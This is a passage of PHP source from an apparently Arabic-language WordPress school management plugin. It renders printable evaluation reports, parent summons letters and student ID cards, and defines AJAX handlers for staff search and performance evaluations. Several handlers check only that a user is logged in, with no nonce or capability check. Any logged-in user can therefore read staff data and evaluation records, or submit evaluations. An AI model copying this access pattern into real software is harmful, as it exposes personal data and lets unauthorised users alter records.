                            <?php endforeach; endif; ?>
                        </tbody>
                    </table>
                </div>

                <?php if (!empty($eval->comments)): ?>
                <div class="card">
                    <h4 style="margin:0 0 6px 0; font-size: 12px; font-weight: 800; color: #0f172a;">ملاحظات وتوصيات المقيم:</h4>
                    <p style="margin:0; font-size: 11.5px; color: #334155; white-space: pre-line;"><?php echo esc_html($eval->comments); ?></p>
                </div>
                <?php endif; ?>

                <div style="display: flex; justify-content: space-between; margin-top: 30px; padding-top: 15px; border-top: 1px solid #cbd5e1; font-size: 11px;">
                    <div>المقيم المسجّل: <strong><?php echo esc_html($eval->evaluator_name); ?></strong></div>
                    <div>تاريخ الاعتماد: <strong><?php echo date_i18n('Y-m-d H:i', strtotime($eval->created_at)); ?></strong></div>
                </div>
            </body>
            </html>
            <?php
            exit;
        } elseif ($print_type === 'parent_summons') {
            $summons_id = intval($_GET['summons_id'] ?? 0);
            global $wpdb;
            $summons = $wpdb->get_row($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_parent_summons WHERE id = %d", $summons_id));
            if (!$summons) wp_die('وثيقة الاستدعاء غير موجودة.');

            $student = SM_DB::get_student_by_id($summons->student_id);
            if (!$student) wp_die('الطالب المعني غير موجود.');

            $school_info = SM_Settings::get_school_info();
            $sch_obj = $student->school_id ? EESS_Org_Helper::get_school_by_id($student->school_id) : null;
            $school_name = $sch_obj ? $sch_obj->name : ($school_info['school_name'] ?? 'مدرسة EESS التعليمية');

            ?>
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <title>استدعاء ولي أمر رسمية — <?php echo esc_html($student->name); ?></title>
                <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
                <style>
                    body { font-family: 'Cairo', sans-serif; padding: 40px; color: #0f172a; background: white; line-height: 1.8; direction: rtl; text-align: right; }
                    .document-card { max-width: 800px; margin: 0 auto; border: 2px solid #0f172a; border-radius: 16px; padding: 35px; box-shadow: 0 4px 20px rgba(0,0,0,0.04); }
                    .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid #881337; padding-bottom: 20px; margin-bottom: 25px; }
                    .meta-table { width: 100%; border-collapse: collapse; margin-bottom: 25px; }
                    .meta-table th, .meta-table td { border: 1px solid #cbd5e1; padding: 12px 16px; font-size: 13px; text-align: right; }
                    .meta-table th { background: #f8fafc; font-weight: bold; width: 25%; color: #334155; }
                    .footer-sig { display: flex; justify-content: space-between; margin-top: 50px; text-align: center; }
                    @media print { .no-print { display: none !important; } body { padding: 0; } .document-card { border: none; box-shadow: none; width: 100%; } }
                </style>
            </head>
            <body onload="window.print()">
                <div class="no-print" style="text-align: center; margin-bottom: 20px;">
                    <button onclick="window.print()" style="background: #881337; color: white; border: none; padding: 10px 24px; border-radius: 8px; font-weight: 800; cursor: pointer; font-family: 'Cairo';">🖨️ طباعة طي الاستدعاء الرسمي A4</button>
                </div>
                <div class="document-card">
                    <div class="header">
                        <div>
                            <h2 style="margin: 0; font-size: 20px; font-weight: 900; color: #0f172a;"><?php echo esc_html($school_name); ?></h2>
                            <div style="font-size: 13px; color: #881337; font-weight: 800; margin-top: 4px;"><?php echo esc_html($summons->department_requester); ?> — إشعار استدعاء ولي أمر رسمية</div>
                        </div>
                        <img src="<?php echo esc_url($school_info['logo_url'] ?? SM_PLUGIN_URL . 'assets/images/logo.png'); ?>" style="height: 50px; max-width: 120px; object-fit: contain;" onerror="this.style.display='none'">
                    </div>

                    <div style="background: #fff8f8; border: 1px solid #fecdd3; padding: 15px 20px; border-radius: 12px; margin-bottom: 25px;">
                        <h4 style="margin: 0 0 6px 0; color: #881337; font-size: 15px; font-weight: 800;">المكرم ولي أمر الطالب / الطالبة: <?php echo esc_html($student->name); ?></h4>
                        <p style="margin: 0; font-size: 13px; color: #334155;">تحية طيبة وبعد،،، يرجى تكرمكم بالحضور لمقر إدارة المدرسة لمقابلة المسئولين لمناقشة أمور هامة تتعلق بالطالب.</p>
                    </div>

                    <table class="meta-table">
                        <tr><th>اسم الطالب:</th><td><strong><?php echo esc_html($student->name); ?></strong></td><th>الكود / الصف:</th><td><?php echo esc_html($student->student_code . ' | ' . $student->class_name . ' (' . ($student->section ?: 'أ') . ')'); ?></td></tr>
                        <tr><th>تاريخ الموعد:</th><td><strong><?php echo esc_html($summons->summons_date); ?></strong></td><th>توقيت الحضور:</th><td><strong><?php echo esc_html($summons->summons_time ?: '10:00 صباحاً'); ?></strong></td></tr>
                        <tr><th>الجهة الطالبة:</th><td><?php echo esc_html($summons->department_requester); ?></td><th>سبب الاستدعاء:</th><td><strong><?php echo esc_html($summons->reason); ?></strong></td></tr>
                        <?php if (!empty($summons->notes)): ?>
                            <tr><th>ملاحظات وتوجيهات:</th><td colspan="3"><?php echo esc_html($summons->notes); ?></td></tr>
                        <?php endif; ?>
                    </table>

                    <div class="footer-sig">
                        <div>
                            <div>الجهة المصدرة للاستدعاء</div>
                            <div style="margin-top: 35px; font-weight: 800;"><?php echo esc_html($summons->department_requester); ?></div>
                        </div>
                        <div>
                            <div>ختم واعتماد إدارة المدرسة</div>
                            <div style="margin-top: 35px; font-weight: 800;"><?php echo esc_html($school_name); ?></div>
                        </div>
                    </div>

                    <div style="margin-top: 40px; text-align: center; border-top: 1px solid #cbd5e1; padding-top: 10px; font-size: 10px; color: #64748b;">Powered by Educational Electronic Systems Solutions (EESS) — eess.online</div>
                </div>
            </body>
            </html>
            <?php
            exit;
        } elseif ($print_type === 'id_card' || $print_type === 'student_card') {
            global $wpdb;
            $stu_ids = array();
            if (!empty($_GET['student_id'])) {
                $stu_ids[] = intval($_GET['student_id']);
            } elseif (!empty($_GET['student_ids'])) {
                $stu_ids = array_map('intval', explode(',', $_GET['student_ids']));
            } else {
                $stu_ids = $wpdb->get_col("SELECT id FROM {$wpdb->prefix}sm_students ORDER BY name ASC LIMIT 50");
            }

            if (empty($stu_ids)) {
                wp_die('لم يتم العثور على طلاب للطباعة.');
            }

            // Fetch all student records first for bulk photo filtering
            $all_students = array();
            foreach ($stu_ids as $sid) {
                $st = SM_DB::get_student_by_id($sid);
                if ($st) {
                    $all_students[] = $st;
                }
            }

            $excluded_students = array();
            $printable_students = array();

            if (count($all_students) > 1) {
                foreach ($all_students as $st) {
                    if (empty($st->photo_url)) {
                        $excluded_students[] = $st;
                    } else {
                        $printable_students[] = $st;
                    }
                }
                // If all selected students lack photos, fallback to printing all with notice placeholders
                if (empty($printable_students)) {
                    $printable_students = $all_students;
                    $excluded_students = array();
                }
            } else {
                $printable_students = $all_students;
            }

            $school_info = SM_Settings::get_school_info();
            $system_logo = !empty($school_info['school_logo']) ? $school_info['school_logo'] : (!empty($school_info['logo_url']) ? $school_info['logo_url'] : SM_PLUGIN_URL . 'assets/images/logo.png');
            $acad_struct = SM_Settings::get_academic_structure();
            $acad_year = $acad_struct['academic_year'] ?? '2026/2027';
            $expiry_date = '30/06/' . (substr($acad_year, -4) ?: '2027');

            ?>
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <title>Student Exit ID Card — بطاقة تصريح الخروج الرقمية</title>
                <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
                <style>
                    * { box-sizing: border-box; margin: 0; padding: 0; }
                    body { font-family: 'Cairo', sans-serif; background: #e2e8f0; color: #0f172a; padding: 20px; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
                    .cards-container { display: flex; flex-wrap: wrap; gap: 20px; justify-content: center; }

                    /* Standard CR80 Personal ID Card Dimensions: 85.6mm x 53.98mm with realistic plastic rounded corners (3.18mm) */
                    .id-card {
                        width: 85.6mm;
                        height: 53.98mm;
                        background: #ffffff;
                        border: 1px solid #cbd5e1;
                        border-radius: 3.18mm;
                        position: relative;
                        display: flex;
                        flex-direction: column;
                        justify-content: space-between;
                        box-shadow: 0 4px 15px rgba(0,0,0,0.1);
                        page-break-inside: avoid;
                        overflow: hidden;
                    }

                    /* Header spanning full width edge-to-edge */
                    .card-header {
                        width: 100%;
                        background: linear-gradient(135deg, #881337 0%, #4c0519 100%);
                        color: #ffffff;
                        padding: 4px 10px;
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                        border-bottom: 2px solid #e11d48;
                    }
                    .card-header-right { display: flex; align-items: center; gap: 8px; }

                    /* Compact Rounded Square Logo Box */
                    .card-logo-box {
                        width: 26px;
                        height: 26px;
                        border-radius: 6px;
                        background: #ffffff;
                        padding: 2px;
                        border: 1px solid rgba(255, 255, 255, 0.4);
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        flex-shrink: 0;
                        box-shadow: 0 1px 3px rgba(0,0,0,0.15);
                    }
                    .card-sys-logo { width: 100%; height: 100%; object-fit: contain; border-radius: 4px; }

                    .card-header-titles { line-height: 1.15; }
                    .card-title-main { font-size: 11.5px; font-weight: 900; color: #ffffff; letter-spacing: -0.2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 48mm; }
                    .card-school-name { font-size: 8.5px; font-weight: 700; color: #fecdd3; }
                    .card-acad-year-text { font-size: 10px; color: #ffffff; font-weight: 900; text-align: left; letter-spacing: 0.5px; }

                    .card-body {
                        display: flex;
                        gap: 6px;
                        align-items: center;
                        padding: 4px 7px;
                        flex: 1;
                        position: relative;
                        background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 150' preserveAspectRatio='none'><path d='M0,40 C150,140 350,-40 500,40 L500,150 L0,150 Z' fill='%23f1f5f9' opacity='0.15'/><path d='M0,80 C200,20 300,120 500,60 L500,150 L0,150 Z' fill='%23fee2e2' opacity='0.08'/></svg>");
                        background-repeat: no-repeat;
                        background-size: cover;
                        background-position: bottom;
                    }

                    /* Photo Wrapper & Blurred Missing Photo Placeholder */
                    .card-photo-box {
                        width: 22mm;
                        height: 28mm;
                        border-radius: 4px;
                        border: 1.5px solid #0f172a;
                        background: #f1f5f9;
                        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                        flex-shrink: 0;
                        overflow: hidden;
                        position: relative;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                    }
                    .card-photo {
                        width: 100%;
                        height: 100%;
                        object-fit: cover;
                    }
                    .card-photo-missing {
                        width: 100%;
                        height: 100%;
                        background: #cbd5e1;
                        filter: blur(0.5px);
                        display: flex;
                        flex-direction: column;
                        align-items: center;
                        justify-content: center;
                        text-align: center;
                        padding: 2px;
                        color: #475569;
                    }
                    .card-photo-missing-text {
                        font-size: 6.5px;
                        font-weight: 800;
                        line-height: 1.15;
                        color: #1e293b;
                        background: rgba(255, 255, 255, 0.85);
                        padding: 3px 2px;
                        border-radius: 3px;
                        border: 1px solid #94a3b8;
                    }

                    /* Student Info Layout — Tight, Balanced & Professional Typography */
                    .card-info { flex: 1; min-width: 0; display: flex; flex-direction: column; justify-content: center; padding-right: 2px; }
                    .card-stu-name { font-weight: 900; color: #0f172a; margin-bottom: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; line-height: 1.25; }
                    .card-field { font-size: 8.5px; color: #334155; font-weight: 700; margin-bottom: 1px; display: flex; align-items: center; gap: 2px; }
                    .card-field-label { color: #64748b; font-weight: 700; width: 42px; min-width: 42px; flex-shrink: 0; }
                    .card-field-val { color: #0f172a; font-weight: 900; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-right: 2px; }

                    /* Barcode / Serial Stack Vertically Centered */
                    .card-qr-stack { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 21mm; flex-shrink: 0; text-align: center; }
                    .card-qr-box { width: 18.5mm; height: 18.5mm; border: 1px solid #cbd5e1; border-radius: 4px; padding: 1px; background: #ffffff; }
                    .card-qr-box svg { width: 100%; height: 100%; display: block; }
                    .card-serial-text { font-size: 8px; font-weight: 900; color: #881337; margin-top: 2px; letter-spacing: 0.3px; line-height: 1; }

                    /* Footer Area */
                    .card-footer {
                        width: 100%;
                        background: #f8fafc;
                        border-top: 1px solid #e2e8f0;
                        padding: 2px 8px;
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                        font-size: 6.5px;
                        color: #64748b;
                        font-weight: 700;
                    }
                    .card-footer-auth { color: #166534; font-weight: 900; }

                    @media print {
                        @page { size: A4; margin: 10mm; }
                        body { background: none; padding: 0; }
                        .no-print { display: none !important; }
                        .cards-container { gap: 8mm; }
                        .id-card { box-shadow: none; border: 1px solid #94a3b8; page-break-inside: avoid; }
                    }
                </style>
            </head>
            <body>
                <div class="no-print" style="text-align: center; margin-bottom: 15px;">
                    <button onclick="window.print()" style="background: #881337; color: white; border: none; padding: 10px 24px; border-radius: 8px; font-weight: 800; cursor: pointer; font-family: 'Cairo'; font-size: 14px; box-shadow: 0 4px 10px rgba(0,0,0,0.15);">🖨️ طباعة بطاقات الخروج الرسمية (ID Card / A4)</button>
                </div>

                <?php if (!empty($excluded_students)): ?>
                <div class="no-print" style="max-width: 800px; margin: 0 auto 15px auto; background: #fef3c7; border: 1px solid #fde68a; color: #92400e; padding: 10px 16px; border-radius: 10px; font-size: 12px; font-weight: 700; text-align: right; line-height: 1.5;">
                    ⚠️ تنبيه: تم استبعاد (<?php echo count($excluded_students); ?>) طالب من عملية الطباعة الجماعية لعدم رفع صورة شخصية لهم:
                    <strong><?php echo esc_html(implode('، ', array_map(function($s) { return $s->name; }, $excluded_students))); ?></strong>.
                </div>
                <?php endif; ?>

                <div class="cards-container">
                    <?php foreach ($printable_students as $st):
                        $sch_obj = $st->school_id ? EESS_Org_Helper::get_school_by_id($st->school_id) : null;
                        $s_name = $sch_obj ? $sch_obj->name : ($school_info['school_name'] ?? 'مدرسة EESS التعليمية');
                        $s_logo = ($sch_obj && !empty($sch_obj->logo_url)) ? esc_url($sch_obj->logo_url) : $system_logo;

                        $serial = $st->student_code ?: ('STU-' . $st->id);
                        $qr_svg = $this->eess_generate_qr_code_svg($serial);
                        $has_photo = !empty($st->photo_url);
                        $photo_src = $has_photo ? esc_url($st->photo_url) : '';

                        // Dynamic single-line font scaling for student name
                        $name_len = mb_strlen($st->name);
                        $name_font_size = $name_len > 28 ? '8.5px' : ($name_len > 22 ? '9.5px' : '11px');

                        // Clean non-duplicated values (Strip duplicated 'الصف' or 'شعبة' labels)
                        $clean_class = trim(preg_replace('/^(الصف|صف|Grade|grade)\s*:?\s*/u', '', $st->class_name ?: ''));
                        $clean_section = trim(preg_replace('/^(الشعبة|شعبة|Section|section)\s*:?\s*/u', '', $st->section ?: 'أ'));
                    ?>
                    <div class="id-card">
                        <div class="card-header">
                            <div class="card-header-right">
                                <div class="card-logo-box">
                                    <img src="<?php echo esc_url($s_logo); ?>" class="card-sys-logo" alt="Logo" onerror="this.style.display='none'">
                                </div>
                                <div class="card-header-titles">
                                    <div class="card-title-main" title="<?php echo esc_attr($s_name); ?>"><?php echo esc_html($s_name); ?></div>
                                    <div class="card-school-name">بطاقة خروج طالب نهاية الدوام</div>
                                </div>
                            </div>
                            <div class="card-acad-year-text">
                                <?php echo esc_html($acad_year); ?>
                            </div>
                        </div>

                        <div class="card-body">
                            <div class="card-photo-box">
                                <?php if ($has_photo): ?>
                                    <img src="<?php echo $photo_src; ?>" class="card-photo" alt="Student Photo">
                                <?php else: ?>
                                    <div class="card-photo-missing">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="#64748b" style="margin-bottom: 2px;"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                                        <div class="card-photo-missing-text">الصورة الشخصية<br>غير مرفوعة</div>
                                    </div>
                                <?php endif; ?>
                            </div>
                            <div class="card-info">
                                <div class="card-stu-name" style="font-size: <?php echo $name_font_size; ?>;" title="<?php echo esc_attr($st->name); ?>"><?php echo esc_html($st->name); ?></div>
                                <div class="card-field">
                                    <span class="card-field-label">الصف:</span>
                                    <span class="card-field-val"><?php echo esc_html($clean_class ?: 'الأول'); ?></span>
                                </div>
                                <div class="card-field">
                                    <span class="card-field-label">الشعبة:</span>
                                    <span class="card-field-val"><?php echo esc_html($clean_section ?: 'أ'); ?></span>
                                </div>
                                <div class="card-field">
                                    <span class="card-field-label">رقم الطالب:</span>
                                    <span class="card-field-val" style="color: #881337;"><?php echo esc_html($serial); ?></span>
                                </div>
                            </div>
                            <div class="card-qr-stack">
                                <div class="card-qr-box" title="<?php echo esc_attr($serial); ?>"><?php echo $qr_svg; ?></div>
                                <div class="card-serial-text"><?php echo esc_html($serial); ?></div>
                            </div>
                        </div>

                        <div class="card-footer">
                            <span class="card-footer-auth">تصريح خروج معتمد</span>
                            <span style="font-size: 5.5px; opacity: 0.85; font-family: monospace, sans-serif;">Powered by Educational Systems Solutions (EESS) - eess.online</span>
                        </div>
                    </div>
                    <?php endforeach; ?>
                </div>
            </body>
            </html>
            <?php
            exit;
        } else {
            wp_die('نوع الطباعة غير مدعوم.');
        }
    }

    /**
     * UNIFIED USER & EMPLOYEE MODAL AJAX HANDLERS
     */
    public function ajax_check_user_uniqueness() {
        check_ajax_referer('sm_user_action', 'sm_nonce');
        if (!current_user_can('manage_options') && !current_user_can('edit_users')) {
            wp_send_json_error('عذراً، لا تمتلك الصلاحية لهذه العملية.');
        }

        $field   = sanitize_text_field($_POST['field'] ?? '');
        $value   = sanitize_text_field($_POST['value'] ?? '');
        $user_id = intval($_POST['user_id'] ?? 0);

        if (empty($field) || empty($value)) {
            wp_send_json_success(array('exists' => false));
        }

        if ($field === 'username') {
            $user = get_user_by('login', $value);
            if ($user && $user->ID !== $user_id) {
                wp_send_json_success(array('exists' => true, 'message' => 'اسم المستخدم مستخدم بالفعل لنظام آخر.'));
            }
        } elseif ($field === 'email') {
            $user = get_user_by('email', $value);
            if ($user && $user->ID !== $user_id) {
                wp_send_json_success(array('exists' => true, 'message' => 'البريد الإلكتروني مسجل لمستخدم آخر.'));
            }
        } elseif ($field === 'employee_id') {
            $existing = get_users(array(
                'meta_key'     => 'sm_employee_id',
                'meta_value'   => $value,
                'number'       => 1,
                'exclude'      => array($user_id),
                'fields'       => 'ID'
            ));
            if (!empty($existing)) {
                wp_send_json_success(array('exists' => true, 'message' => 'الرقم الوظيفي (ID) مخصص لموظف آخر.'));
            }
        }

        wp_send_json_success(array('exists' => false));
    }

    public function ajax_search_teachers_autocomplete() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');

        $query = sanitize_text_field($_POST['query'] ?? '');
        if (mb_strlen($query) < 3) {
            wp_send_json_success(array());
        }

        $all_teachers = get_users(array(
            'role'    => 'sm_teacher',
            'number'  => 30,
            'orderby' => 'display_name',
            'order'   => 'ASC'
        ));

        $results = array();
        $q_lower = mb_strtolower($query);

        foreach ($all_teachers as $u) {
            $emp_num = get_user_meta($u->ID, 'eess_employee_number', true) ?: (get_user_meta($u->ID, 'sm_employee_id', true) ?: $u->user_login);
            $name = $u->display_name;

            if (mb_strpos(mb_strtolower($name), $q_lower) !== false || mb_strpos(mb_strtolower($emp_num), $q_lower) !== false) {
                $results[] = array(
                    'id'              => $u->ID,
                    'name'            => $name,
                    'employee_number' => $emp_num
                );
            }
        }

        wp_send_json_success($results);
    }

    public function ajax_search_employees_for_eval() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');

        $query = sanitize_text_field($_POST['query'] ?? '');
        $all_users = get_users(array(
            'number' => 100,
            'orderby' => 'display_name',
            'order' => 'ASC'
        ));

        $results = array();
        $q_lower = mb_strtolower($query);

        foreach ($all_users as $u) {
            $roles = (array) $u->roles;
            if (in_array('sm_student', $roles) || in_array('sm_parent', $roles)) continue;

            $emp_num = get_user_meta($u->ID, 'eess_employee_number', true) ?: (get_user_meta($u->ID, 'sm_employee_id', true) ?: $u->user_login);
            $name = $u->display_name;

            if ($query && mb_strpos(mb_strtolower($name), $q_lower) === false && mb_strpos(mb_strtolower($emp_num), $q_lower) === false) {
                continue;
            }

            $role_primary = reset($roles) ?: 'sm_teacher';
            $school_name = get_user_meta($u->ID, 'eess_school_name', true) ?: 'المدرسة الرئيسية';
            $department = get_user_meta($u->ID, 'eess_department', true) ?: (get_user_meta($u->ID, 'department', true) ?: 'قسم التربية البدنية والصحية');
            $subject = get_user_meta($u->ID, 'sm_specialization', true) ?: (get_user_meta($u->ID, 'specialization', true) ?: 'عام');

            $assigned_grades_raw = get_user_meta($u->ID, 'sm_assigned_grades', true) ?: (get_user_meta($u->ID, 'eess_assigned_grades', true) ?: 'الصف العاشر');
            if (is_array($assigned_grades_raw)) $assigned_grades_raw = implode(', ', $assigned_grades_raw);
            $assigned_grades_clean = str_replace(array('[', ']', '"', "'", '\\'), '', (string)$assigned_grades_raw);

            $results[] = array(
                'id' => $u->ID,
                'name' => $name,
                'employee_number' => $emp_num,
                'role_key' => $role_primary,
                'school_name' => $school_name,
                'department' => $department,
                'subject' => $subject,
                'assigned_grades' => $assigned_grades_clean,
                'photo_url' => get_avatar_url($u->ID, array('size' => 80))
            );
        }

        wp_send_json_success($results);
    }

    public function ajax_get_employee_system_performance_indicators() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');

        $user_id = intval($_POST['user_id'] ?? 0);
        if ($user_id <= 0) wp_send_json_error('Invalid ID');

        global $wpdb;

        // Lesson Prep Stats
        $prep_stats = $wpdb->get_row($wpdb->prepare("
            SELECT
                COUNT(*) as total_preps,
                SUM(CASE WHEN status = 'approved' THEN 1 ELSE 0 END) as approved_preps,
                SUM(CASE WHEN delay_seconds > 0 THEN 1 ELSE 0 END) as late_preps
            FROM {$wpdb->prefix}sm_lesson_preps
            WHERE teacher_id = %d
        ", $user_id));

        $total_preps = intval($prep_stats->total_preps ?? 0);
        $late_preps = intval($prep_stats->late_preps ?? 0);
        $ontime_preps = max(0, $total_preps - $late_preps);
        $prep_compliance = $total_preps > 0 ? round(($ontime_preps / $total_preps) * 100) : 100;

        // Term Plans Stats
        $plan_stats = $wpdb->get_row($wpdb->prepare("
            SELECT
                COUNT(*) as total_plans,
                SUM(CASE WHEN status = 'approved' THEN 1 ELSE 0 END) as approved_plans
            FROM {$wpdb->prefix}sm_term_plans
            WHERE teacher_id = %d
        ", $user_id));

        $total_plans = intval($plan_stats->total_plans ?? 0);
        $approved_plans = intval($plan_stats->approved_plans ?? 0);
        $plan_compliance = $total_plans > 0 ? round(($approved_plans / $total_plans) * 100) : 100;

        $overall_system_score = round(($prep_compliance + $plan_compliance) / 2, 1);

        wp_send_json_success(array(
            'prep_total' => $total_preps,
            'prep_ontime' => $ontime_preps,
            'prep_late' => $late_preps,
            'prep_compliance_pct' => $prep_compliance,
            'plan_total' => $total_plans,
            'plan_approved' => $approved_plans,
            'plan_compliance_pct' => $plan_compliance,
            'overall_system_score' => $overall_system_score
        ));
    }

    public function ajax_get_eval_template_for_role() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');

        $role_key = sanitize_text_field($_POST['role_key'] ?? 'sm_teacher');
        global $wpdb;

        // Fetch custom template from DB if exists
        $tmpl = $wpdb->get_row($wpdb->prepare("
            SELECT * FROM {$wpdb->prefix}sm_eval_templates WHERE role_key = %s AND is_active = 1 ORDER BY id DESC LIMIT 1
        ", $role_key));

        if ($tmpl) {
            $questions = $wpdb->get_results($wpdb->prepare("
                SELECT * FROM {$wpdb->prefix}sm_eval_questions WHERE template_id = %d ORDER BY display_order ASC
            ", $tmpl->id));

            if (!empty($questions)) {
                $q_list = array();
                foreach ($questions as $q) {
                    $q_list[] = array(
                        'id' => $q->id,
                        'text' => $q->question_text,
                        'category' => $q->category_name ?: 'تقييم كفاءة العمل',
                        'max_score' => intval($q->max_score ?: 10)
                    );
                }

                wp_send_json_success(array(
                    'template_id' => $tmpl->id,
                    'title' => $tmpl->title,
                    'questions' => $q_list
                ));
                return;
            }
        }

        // Default 10 Standard 0-10 Evaluation Questions
        $default_questions = array(
            array('id' => 1, 'text' => 'الالتزام بالحضور والانضباط بالمواعيد والجدول المدرسي الرسمي', 'category' => 'تقييم الانضباط والسلوك', 'max_score' => 10),
            array('id' => 2, 'text' => 'الالتزام المناوب والإشراف اليومي في المواعيد والأماكن المحددة', 'category' => 'تقييم الانضباط والسلوك', 'max_score' => 10),
            array('id' => 3, 'text' => 'الالتزام بتحضير الدروس وتطبيق استراتيجيات التدريس الحديثة والابتكار', 'category' => 'التقييم التربوي والمهني', 'max_score' => 10),
            array('id' => 4, 'text' => 'الالتزام برصد النتائج والتقييم المستمر للطلاب بدقة وموضوعية', 'category' => 'التقييم التربوي والمهني', 'max_score' => 10),
            array('id' => 5, 'text' => 'إدارة البيئة الصفية والمحافظة على الانضباط والسلوك الإيجابي', 'category' => 'التقييم التربوي والمهني', 'max_score' => 10),
            array('id' => 6, 'text' => 'التواصل الفعال والمثمر مع أولياء الأمور وإدارة المدرسة والحافظ على بيئة العمل', 'category' => 'التواصل والتفاعل المؤسسي', 'max_score' => 10),
            array('id' => 7, 'text' => 'المشاركة والمبادرة في الأنشطة المدرسية والفعاليات والبرامج اللانهائية', 'category' => 'التواصل والتفاعل المؤسسي', 'max_score' => 10),
            array('id' => 8, 'text' => 'الالتزام باللوائح والتعاميم السياسية الصادرة من وزارة التربية والتعليم', 'category' => 'الالتزام والتنفيذ', 'max_score' => 10),
            array('id' => 9, 'text' => 'إنجاز التكاليف والمهام الموكلة وإعداد التقرير المدرسية بدقة', 'category' => 'الالتزام والتنفيذ', 'max_score' => 10),
            array('id' => 10, 'text' => 'التطوير المهني الذاتي والمساهمة في تبادل الخبرات الأكاديمية مع الزملاء', 'category' => 'الالتزام والتنفيذ', 'max_score' => 10)
        );

        wp_send_json_success(array(
            'template_id' => 0,
            'title' => 'النموذج القياسي المعتمد لتقييم الأداء الوظيفي',
            'questions' => $default_questions
        ));
    }

    public function ajax_save_evaluation_submission() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');

        $evaluator_id = get_current_user_id();
        $employee_id = intval($_POST['employee_id'] ?? 0);
        $template_id = intval($_POST['template_id'] ?? 0);
        $academic_year = sanitize_text_field($_POST['academic_year'] ?? '2025/2026');
        $category_name = sanitize_text_field($_POST['category_name'] ?? 'تقييم الانضباط والسلوك');
        $comments = sanitize_textarea_field($_POST['comments'] ?? '');
        $answers_raw = $_POST['answers'] ?? array();

        if ($employee_id <= 0 || empty($answers_raw)) {
            wp_send_json_error('يرجى اختيار الموظف والإجابة على أسئلة التقييم.');
        }

        $total_score = 0;
        $max_total = 0;
        $clean_answers = array();

        foreach ($answers_raw as $q_id => $a_val) {
            $score = floatval($a_val['score'] ?? 0);
            $q_text = sanitize_text_field($a_val['question_text'] ?? '');
            $total_score += $score;
            $max_total += 10;
            $clean_answers[] = array(
                'question_id' => $q_id,
                'question_text' => $q_text,
                'score' => $score,
                'max' => 10
            );
        }

        $average_pct = $max_total > 0 ? round(($total_score / $max_total) * 100, 1) : 0;

        global $wpdb;
        $wpdb->insert(
            "{$wpdb->prefix}sm_evaluations",
            array(
                'employee_id' => $employee_id,
                'evaluator_id' => $evaluator_id,
                'template_id' => $template_id,
                'academic_year' => $academic_year,
                'category_name' => $category_name,
                'answers_json' => wp_json_encode($clean_answers),
                'subjective_score' => $total_score,
                'system_score' => 0,
                'total_score' => $total_score,
                'average_pct' => $average_pct,
                'comments' => $comments,
                'status' => 'submitted',
                'created_at' => current_time('mysql'),
                'updated_at' => current_time('mysql')
            )
        );

        SM_Logger::log('save_evaluation', "قام المعيّن بتسجيل تقييم أداء جديد للموظف رقم #{$employee_id} بنسبة {$average_pct}%");

        wp_send_json_success(array('eval_id' => $wpdb->insert_id, 'average_pct' => $average_pct));
    }

    public function ajax_get_evaluations_archive() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');

        global $wpdb;
        $acad_year = sanitize_text_field($_POST['academic_year'] ?? '');
        $query_text = sanitize_text_field($_POST['query'] ?? '');

        $sql = "SELECT e.*, u_emp.display_name as emp_name, u_eval.display_name as evaluator_name
                FROM {$wpdb->prefix}sm_evaluations e
                JOIN {$wpdb->prefix}users u_emp ON e.employee_id = u_emp.ID
                JOIN {$wpdb->prefix}users u_eval ON e.evaluator_id = u_eval.ID
                WHERE 1=1";
        $params = array();

        if ($acad_year) {
            $sql .= " AND e.academic_year = %s";
            $params[] = $acad_year;
        }

        if ($query_text) {
            $sql .= " AND (u_emp.display_name LIKE %s OR u_eval.display_name LIKE %s)";
            $params[] = '%' . $wpdb->esc_like($query_text) . '%';
            $params[] = '%' . $wpdb->esc_like($query_text) . '%';
        }

        $sql .= " ORDER BY e.id DESC LIMIT 100";

        $rows = !empty($params) ? $wpdb->get_results($wpdb->prepare($sql, $params)) : $wpdb->get_results($sql);
        $results = array();

        foreach ($rows as $r) {
            $emp_num = get_user_meta($r->employee_id, 'eess_employee_number', true) ?: $r->employee_id;
            $results[] = array(
                'id' => $r->id,
                'employee_name' => $r->emp_name,
                'employee_number' => $emp_num,
                'evaluator_name' => $r->evaluator_name,
                'academic_year' => $r->academic_year,
                'category_name' => $r->category_name,
                'total_score' => $r->total_score,
                'average_pct' => $r->average_pct,
                'status' => $r->status,
                'comments' => $r->comments,
                'date' => date_i18n('Y-m-d H:i', strtotime($r->created_at))
            );
        }

        wp_send_json_success($results);
    }

    public function ajax_save_eval_template() {
        $user_roles = (array) wp_get_current_user()->roles;
        $is_auth = current_user_can('manage_options') || current_user_can('manage_hr') || in_array('administrator', $user_roles) || in_array('sm_system_admin', $user_roles) || in_array('sm_principal', $user_roles) || in_array('sm_hod', $user_roles) || in_array('sm_discipline_supervisor', $user_roles);
        if (!$is_auth) {
